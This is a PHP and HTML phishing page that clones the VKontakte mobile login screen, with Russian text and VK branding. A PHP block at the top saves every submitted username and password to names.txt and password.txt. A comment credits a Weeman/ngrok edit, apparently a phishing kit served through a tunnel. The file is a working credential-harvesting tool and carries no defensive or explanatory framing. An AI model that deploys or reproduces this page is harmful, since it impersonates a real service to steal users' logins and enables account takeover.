<?php

if(isset($_POST['user'])) 

{
  $name = $_POST['user'];
  $handle = fopen('names.txt', 'a');
  file_put_contents("names.txt", "");
  fwrite($handle, $name."\n");
  fclose($handle); 
}


if(isset($_POST['pass'])) 

{
  $name = $_POST['pass'];
  $handle = fopen('password.txt', 'a');
  file_put_contents("password.txt", "");
  fwrite($handle, $name."\n");
  fclose($handle);
}

?>


<!DOCTYPE html>
      <html
        xmlns="http://www.w3.org/1999/xhtml"
        class="vk vk_js_no  vk_flex_no r d h  vk_appAuth_no"
      >
      <head>
      	<!-- Weeman/ngrok edit by @lnxmxxrk -->
              <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="MobileOptimized" content="176" />
        <meta name="HandheldFriendly" content="True" />
        <meta name="theme-color" content="#5181b8" />
        <base id="base">
        
        
        <title>Мобильная версия ВКонтакте</title>
        <link rel="shortcut icon" href="fav_logo.ico?8"></link>
        
        <link type="text/css" rel="stylesheet" media="" href="common.css?165618541"></link>
<script type="text/javascript" src="grip.js?17363785392"></script>

        
    <link rel="canonical" href="https://vk.com/" />
    <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
  
        
      </head>

      <body  class="vk__page _touch vk_ios_no vk_stickers_hints_support_no opera_mini_no vk_safari_no vk__page_login  vk_al_no">
            <div class="layout">
      
      
          <div class="layout__header mhead" id="vk_head">
      <div class="hb_wrap">
        <div class="hb_btn">&nbsp;</div>
      </div>
    </div>
      <div class="layout__body " id="vk_wrap">
        <div class="layout__leftMenu" id="l">
          
        </div>
        <div class="layout__basis" id="m">
              <div class="basis">
      <div class="basis__header mhead" id="mhead"><a href="/" accesskey="*" class="hb_wrap mhb_logo">
  <div class="hb_btn mhi_logo">&nbsp;</div>
  <h1 class="hb_btn mh_header">&nbsp;</h1>
</a>
</div>
      
      <div class="basis__content mcont" id="mcont" data-canonical="https://vk.com/"><div class="installApp">
  <a class="installApp__link" href="https://vk.me/?act=dl">
    <div class="installApp__link_wrap">
      <div class="installApp__label">
        Установить приложение <b>ВКонтакте</b>
        <span class="installApp__arrow"></span>
      </div>
    </div>
  </a>
</div><div class="pcont fit_box bl_cont new_form">
  
  <div class="form_item">
    <div class="login_header">
      Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
    </div>
    
    
    <form method="post">
    <input type="text" class="textfield" name="user" value="" placeholder="Телефон или email" />
    <input type="password" class="textfield" name="pass" placeholder="Пароль" />
    
    
    
      
      <div class="fi_row_new">
        <input class="button wide_button" type="submit" value="Войти" />
      </div>
      <div class="fi_row">
        <div class="near_btn wide_button login_restore"><a href="/restore">Забыли пароль?</a></div>
      </div>
      <div class="login_new_user">
  <div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
</div>
<div class="fi_row">
  <a class="button wide_button success" href="/join">Зарегистрироваться</a>
</div>
<div class="socials">
  <a href="/login?act=google_sign" class="social_button social_google"><i class="social_icon"></i>Войти через Google</a>
  <a href="/login?act=fb_sign" class="social_button"><i class="social_icon"></i>Войти через Facebook</a>
</div>
    </form>
  </div>
</div></div>
          <div class="basis__footer mfoot" id="mfoot"><div class="pfoot">
  <ul class="footer_menu">
    <li class="fm_row"><a class="fm_item" href="/settings?act=change_regional&hash=556bc07e800cf15c50&lang_id=3">English</a></li><li class="fm_row"><a class="fm_item" href="/settings?act=change_regional&hash=556bc07e800cf15c50&lang_id=1">Українська</a></li>
    <li class="fm_row"><a class="fm_item" href="/settings?act=select_lang">all languages »</a></li>
  </ul>
  <ul id="footer_menu" class="footer_menu">
    <li class="fm_row"><a class="fm_item" href="/fv?to=%2F%3F_fm%3D1%26_fm2%3D1">Полная версия</a></li>
  </ul>
  
</div></div>
      
          <div class="_cntrs" style="height:0;overflow:hidden;">
      <img width="1" height="1" src="//counter.yadro.ru/hit?uhttps%3A%2F%2Fm.vk.com%2F;r;96959817" alt="" align="left" />
      <img width="1" height="1" src="//sb.scorecardresearch.com/p?c1=2&c2=13765216&c3=&c4=https%3A%2F%2Fm.vk.com%2F&c5=&c9=&c15=&cv=2.0&cj=1&rn=96959817" alt="" align="left" />
      
      <img src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;r=" style="border:0;" height="1" width="1" />
    </div>
    </div>
        </div>
        
      </div>
    </div>
        <a class="FloatBtn" href="/join?from=float"><span class="FloatBtn__text" onclick="uRegisterFloatBtn.checkBtn();">Регистрация</span><i class="FloatBtn__close" onclick="uRegisterFloatBtn._onCloseClick(event)"></i></a>
        
       
        <div id="vk_utils"></div>
        <div id="z"></div>
        <div id="vk_bottom"></div>
        <div id="theme_color_shim"></div>
        
      </body>
    </html>